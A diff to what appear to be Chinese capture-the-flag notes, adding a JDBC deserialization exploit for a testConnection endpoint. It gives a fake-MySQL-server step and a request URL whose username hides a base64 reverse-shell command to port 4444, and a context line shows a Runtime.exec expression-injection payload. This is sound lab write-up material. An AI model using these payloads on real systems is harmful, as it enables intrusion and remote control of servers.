@@ -44,6 +44,21 @@ ${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@ge
 ### testConnection
 会进行一个数据库的test连接,存在jdbc反序列化漏洞
 
+远程`java -jar fake*.jar`开启一个fake server 可以-p指定端口
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231106172857.png)
+
+jdbc命令
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231106173305.png)
+
+```url
+/testConnection?
+driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://host.docker.internal:3308/test?
+autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c
+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-
+d}|{bash,-i}&password=123
+```
+
 # reverse
 
 # pwn
